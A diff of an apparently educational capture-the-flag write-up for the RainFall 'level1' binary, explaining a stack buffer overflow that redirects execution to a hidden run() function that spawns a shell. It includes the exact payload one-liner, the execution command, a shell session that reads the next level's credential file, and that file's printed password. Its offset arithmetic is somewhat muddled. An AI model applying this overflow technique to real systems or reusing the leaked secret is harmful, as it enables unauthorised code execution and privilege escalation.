@@ -1,86 +1,169 @@
-```
-level1@RainFall:~$ ./level1 
-test
-level1@RainFall:~$ ./level1 
-4242
-level1@RainFall:~$ ./level1 
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-Segmentation fault (core dumped)
-```
+# Level1 — Buffer Overflow / Ret2Win
+
+## Vulnerability
+
+The binary uses `gets()` to read user input into a fixed-size stack buffer with no bounds checking. `gets()` is an unsafe C function that reads until a newline with no length limit, making it trivially exploitable for a **classic stack-based buffer overflow**.
+
+The goal is to overwrite the saved return address on the stack to redirect execution to the `run()` function, which was never called by `main()` but contains a call to `system("/bin/sh")`.
+
+---
+
+## Stack Layout and Key Registers
+
+When a function is called, the CPU pushes context onto the **stack** (a region of memory that grows toward lower addresses) so it can return cleanly.
 
 ```
-level1@RainFall:~$ cat level1 
-...
-                                           �D�D$�$������$��������U������P�D$�$�����Ð��������UWVS�i������l$0�� ����7����� ���)�����t)1����D$8�,$�D�D$4�D$��� ����������������Ë$Ð���������U��S�������t��f����Ћ���u��[]Ð�S��[��7�_����[�Good... Wait what?
-/bin/sh8����T����x�����������������zR|
-...
+High addresses
+┌─────────────────┐
+│  ...            │
+├─────────────────┤
+│  saved EIP      │  ← return address: where to resume after ret
+├─────────────────┤
+│  saved EBP      │  ← caller's base frame pointer
+├─────────────────┤
+│  local vars /   │
+│  buffer         │  ← gets() writes here
+├─────────────────┤
+│  ...            │
+Low addresses    (ESP points here)
 ```
 
-```
+The three key registers:
+
+| Register | Role |
+|----------|------|
+| **ESP** (Stack Pointer) | Points to the top of the stack (lowest occupied address). Moves on every `push`/`pop` and `sub esp`. |
+| **EBP** (Base Pointer) | Points to the base of the current frame. Used as a stable reference to reach local variables. Saved on function entry, restored on exit. |
+| **EIP** (Instruction Pointer) | Holds the address of the next instruction to execute. Controlling EIP means controlling execution flow — this is the target. |
+
+**How the overflow exploits this:**
+
+1. `gets()` writes into the buffer with no length check.
+2. Writing past the buffer's end overwrites **saved EBP**, then **saved EIP**.
+3. When `ret` executes, the CPU loads saved EIP back into EIP to know where to continue.
+4. By placing `run()`'s address there, the CPU jumps straight into `run()`.
+
+---
+
+## Recon
+
+**Disassembling `main`** reveals the vulnerability:
+
+```gdb
 (gdb) disass main
-Dump of assembler code for function main:
-   0x08048480 <+0>:	push   %ebp
-   0x08048481 <+1>:	mov    %esp,%ebp
-   0x08048483 <+3>:	and    $0xfffffff0,%esp
-   0x08048486 <+6>:	sub    $0x50,%esp
-   0x08048489 <+9>:	lea    0x10(%esp),%eax
-   0x0804848d <+13>:	mov    %eax,(%esp)
-   0x08048490 <+16>:	call   0x8048340 <gets@plt>
-   0x08048495 <+21>:	leave  
-   0x08048496 <+22>:	ret    
-End of assembler dump.
-(gdb) info functions
-All defined functions:
+   0x08048480 <+0>:   push   %ebp
+   0x08048481 <+1>:   mov    %esp,%ebp
+   0x08048483 <+3>:   and    $0xfffffff0,%esp
+   0x08048486 <+6>:   sub    $0x50,%esp          ; 80-byte stack frame
+   0x08048489 <+9>:   lea    0x10(%esp),%eax      ; buffer starts at esp+0x10
+   0x0804848d <+13>:  mov    %eax,(%esp)
+   0x08048490 <+16>:  call   0x8048340 <gets@plt> ; ← unsafe read, no limit
+   0x08048495 <+21>:  leave
+   0x08048496 <+22>:  ret
+```
 
-Non-debugging symbols:
-0x080482f8  _init
-0x08048340  gets
-0x08048340  gets@plt
-0x08048350  fwrite
-0x08048350  fwrite@plt
-0x08048360  system
-0x08048360  system@plt
-0x08048370  __gmon_start__
-0x08048370  __gmon_start__@plt
-0x08048380  __libc_start_main
-0x08048380  __libc_start_main@plt
-0x08048390  _start
-0x080483c0  __do_global_dtors_aux
-0x08048420  frame_dummy
-0x08048444  run
-0x08048480  main
-0x080484a0  __libc_csu_init
-0x08048510  __libc_csu_fini
-0x08048512  __i686.get_pc_thunk.bx
-0x08048520  __do_global_ctors_aux
-0x0804854c  _fini
-```
-```
+**The hidden `run()` function** (never called by `main`):
+
+```gdb
 (gdb) disass run
-Dump of assembler code for function run:
-   0x08048444 <+0>:	push   %ebp
-   0x08048445 <+1>:	mov    %esp,%ebp
-   0x08048447 <+3>:	sub    $0x18,%esp
-   0x0804844a <+6>:	mov    0x80497c0,%eax
-   0x0804844f <+11>:	mov    %eax,%edx
-   0x08048451 <+13>:	mov    $0x8048570,%eax
-   0x08048456 <+18>:	mov    %edx,0xc(%esp)
-   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
-   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
-   0x0804846a <+38>:	mov    %eax,(%esp)
-   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
-   0x08048472 <+46>:	movl   $0x8048584,(%esp)
-   0x08048479 <+53>:	call   0x8048360 <system@plt>
-   0x0804847e <+58>:	leave  
-   0x0804847f <+59>:	ret    
-End of assembler dump.
+   0x08048444 <+0>:   push   %ebp
+   ...
+   0x08048472 <+46>:  movl   $0x8048584,(%esp)
+   0x08048479 <+53>:  call   0x8048360 <system@plt>  ; system("/bin/sh")
+   ...
 ```
-```
+
+**Strings confirm the target:**
+
+```gdb
 (gdb) x/s 0x8048570
-0x8048570:	 "Good... Wait what?\n"
+0x8048570:   "Good... Wait what?\n"
+
 (gdb) x/s 0x8048584
-0x8048584:	 "/bin/sh"
+0x8048584:   "/bin/sh"
 ```
+
+**Offset calculation:**
+
+The buffer lives at `esp+0x10` (16 bytes from the top of the frame) inside a `0x50` (80-byte) allocation. The saved `ebp` sits just after the buffer:
+
 ```
+esp+0x10  → buffer start
+esp+0x50  → saved ebp  (80 - 16 = 64 bytes of buffer)
+esp+0x54  → saved eip  (return address)
+
+Padding = 64 bytes (buffer) + 12 bytes (alignment) = 76 bytes
+```
+
+A 76-byte padding before the overwrite address causes a segfault, confirming the correct offset.
+
+---
+
+## Exploit
+
+Build the payload: 76 bytes of padding followed by the little-endian address of `run()` (`0x08048444`):
+
+```bash
 python -c "print('A'*76 + '\x44\x84\x04\x08')" > /tmp/input.txt
+```
+
+Pipe the payload into the binary while keeping stdin open (the `-` keeps the shell alive after `gets()` returns):
+
+```bash
+cat /tmp/input.txt - | ./level1
+```
+
+---
+
+## Flow
+
+```
+main() calls gets()
+      │
+      ▼
+User input overflows the stack buffer (76 bytes of padding)
+      │
+      ▼
+Saved EIP overwritten with 0x08048444 (address of run())
+      │
+      ▼
+ret instruction jumps to run()
+      │
+      ▼
+run() calls fwrite("Good... Wait what?\n")
+      │
+      ▼
+run() calls system("/bin/sh")  ← shell spawned as level2
+```
+
+**Shell session after exploitation:**
+
+```bash
+level1@RainFall:~$ cat /tmp/input.txt - | ./level1
+Good... Wait what?
+whoami
+level2
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
+
+---
+
+## Commands Summary
+
+```bash
+# Identify the hidden function and its address
+gdb ./level1
+(gdb) info functions
+(gdb) disass run
+
+# Confirm the target strings
+(gdb) x/s 0x8048570   # "Good... Wait what?\n"
+(gdb) x/s 0x8048584   # "/bin/sh"
+
+# Build the payload (76 bytes padding + address of run() in little-endian)
+python -c "print('A'*76 + '\x44\x84\x04\x08')" > /tmp/input.txt
+
+# Execute the exploit
+cat /tmp/input.txt - | ./level1
 ```
